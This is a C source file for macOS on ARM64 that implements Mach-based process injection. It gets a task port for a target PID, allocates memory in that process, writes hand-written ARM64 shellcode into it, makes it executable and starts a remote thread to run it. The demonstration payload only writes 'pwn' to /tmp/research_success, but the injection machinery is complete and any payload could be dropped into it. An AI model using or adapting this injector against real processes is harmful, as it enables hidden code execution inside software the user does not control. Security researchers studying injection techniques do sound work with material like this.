#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>              // Core Mach kernel interfaces
#include <mach/mach_vm.h>           // Virtual memory management
#include <mach/arm/thread_status.h> // ARM64 thread state definitions
#include <unistd.h>
#include <pthread.h>

/*
 * This is our shellcode that will run in the target process.
 * The __attribute__((naked)) tells the compiler not to add any function prologue/epilogue
 * code - we want complete control over the assembly.
 *
 * What this shellcode does:
 * 1. Creates a file at /tmp/research_success
 * 2. Writes "pwn" to it
 * 3. Exits cleanly
 */
__attribute__((naked)) void shellcode() {
    __asm__(
        // Set up our stack frame - allocate 32 bytes
        "sub sp, sp, #0x20\n"

        // Open a file
        // The adr instruction loads the address of our filename relative to the current position
        "adr x0, 1f\n"                  // Load filename into x0 (first argument)
        "mov x1, #0x601\n"              // Flags: O_CREAT|O_WRONLY|O_TRUNC
        "mov x2, #0666\n"               // File permissions: rw-rw-rw-
        "mov x16, #5\n"                 // System call number for open()
        "svc #0x80\n"                   // Make the system call
        
        // Write to the file
        "mov x19, x0\n"                 // Save file descriptor for later
        "adr x1, 2f\n"                  // Load address of content to write
        "mov x2, #4\n"                  // Length of content (including newline)
        "mov x16, #4\n"                 // System call number for write()
        "svc #0x80\n"
        
        // Exit cleanly
        "mov x0, #0\n"                  // Exit code 0
        "mov x16, #1\n"                 // System call number for exit()
        "svc #0x80\n"
        
        // Data section
        ".align 4\n"                             // Align data to 4-byte boundary
        "1: .asciz \"/tmp/research_success\"\n"  // Null-terminated filename
        "2: .asciz \"pwn\\n\"\n"                 // Content to write
    );
}

/*
 * Validates that we have a working task port
 * A task port is like a "handle" to another process in macOS,
 * giving us permission to interact with it
 */
static boolean_t verify_task_port(mach_port_t task) {
    task_flavor_t flavor = TASK_BASIC_INFO;
    task_basic_info_data_t info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    
    // Try to get basic info about the task - if this succeeds,
    // we know we have a valid task port
    kern_return_t kr = task_info(task, flavor, (task_info_t)&info, &count);
    return (kr == KERN_SUCCESS);
}

/*
 * This function handles the memory operations needed to inject our code
 * into the target process. It:
 * 1. Allocates memory in the target process
 * 2. Copies our shellcode into that memory
 * 3. Sets the memory permissions so the code can execute
 */
kern_return_t map_memory(mach_port_t task, mach_vm_address_t *addr, void *data, size_t size) {
    kern_return_t kr;
    
    // First, make sure our task port is valid
    if (!verify_task_port(task)) {
        printf("Invalid task port provided\n");
        return KERN_INVALID_TASK;
    }
    
    // Memory pages must be page-aligned in macOS
    // This rounds up our allocation size to the next page boundary
    vm_size_t page_size = vm_page_size;
    size_t aligned_size = (size + page_size - 1) & ~(page_size - 1);
    
    // Allocate memory in the target process
    // VM_FLAGS_ANYWHERE lets the kernel choose a suitable address
    kr = mach_vm_allocate(task, addr, aligned_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("Memory allocation failed: %d (0x%x)\n", kr, kr);
        printf("Attempted to allocate %zu bytes\n", aligned_size);
        return kr;
    }
    
    // Copy our shellcode into the allocated memory
    kr = mach_vm_write(task, *addr, (vm_offset_t)data, size);
    if (kr != KERN_SUCCESS) {
        printf("Memory write failed: %d (0x%x)\n", kr, kr);
        mach_vm_deallocate(task, *addr, aligned_size);
        return kr;
    }
    
    // Set the memory permissions to allow execution
    // We need both read and execute permissions for the code to run
    kr = mach_vm_protect(task, *addr, aligned_size, FALSE, 
                        VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        printf("Memory protection change failed: %d (0x%x)\n", kr, kr);
        mach_vm_deallocate(task, *addr, aligned_size);
        return kr;
    }
    
    return KERN_SUCCESS;
}

/*
 * This is the main injection function that orchestrates the whole process:
 * 1. Verifies we can work with the target process
 * 2. Maps our shellcode into it
 * 3. Creates a new thread to run our code
 */
kern_return_t inject_code(mach_port_t task) {
    kern_return_t kr;
    void *shellcode_ptr = (void*)shellcode;
    size_t shellcode_size = 256;  // Space for our shellcode and any data it needs
    mach_vm_address_t remote_code = 0;
    
    // Verify we can work with this task
    task_basic_info_data_t info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    kr = task_info(task, TASK_BASIC_INFO, (task_info_t)&info, &count);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get task info: %d (0x%x)\n", kr, kr);
        return kr;
    }
    
    // Copy our shellcode into the target process
    kr = map_memory(task, &remote_code, shellcode_ptr, shellcode_size);
    if (kr != KERN_SUCCESS) {
        return kr;
    }
    
    // Set up the initial register state for our new thread
    arm_thread_state64_t thread_state = {0};
    thread_state.__pc = remote_code;    // Program counter - where to start executing
    thread_state.__sp = (remote_code + 0x1000) & ~0xFULL;  // Stack pointer - aligned to 16 bytes
    thread_state.__x[29] = thread_state.__sp;  // Frame pointer
    
    // Create and start a new thread in the target process
    thread_act_t new_thread;
    kr = thread_create_running(task,
                             ARM_THREAD_STATE64,
                             (thread_state_t)&thread_state,
                             ARM_THREAD_STATE64_COUNT,
                             &new_thread);
    
    if (kr != KERN_SUCCESS) {
        printf("Thread creation failed: %d (0x%x)\n", kr, kr);
        mach_vm_deallocate(task, remote_code, shellcode_size);
        return kr;
    }
    
    return KERN_SUCCESS;
}

/*
 * Main entry point - takes a process ID as argument
 * This is where we:
 * 1. Get access to the target process
 * 2. Inject and run our code in it
 * 3. Report success or failure
 */
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    
    pid_t target_pid = atoi(argv[1]);
    
    // Get a task port for the target process
    // This is our "handle" to interact with it
    mach_port_t task;
    kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get task for pid %d: %d (0x%x)\n", target_pid, kr, kr);
        return 1;
    }
    
    printf("Successfully got task port: %d\n", task);
    
    // Do the injection
    kr = inject_code(task);
    if (kr != KERN_SUCCESS) {
        printf("Injection failed with error: %d (0x%x)\n", kr, kr);
        return 1;
    }
    
    printf("Injection successful\n");
    printf("Check /tmp/research_success to verify execution\n");
    
    return 0;
}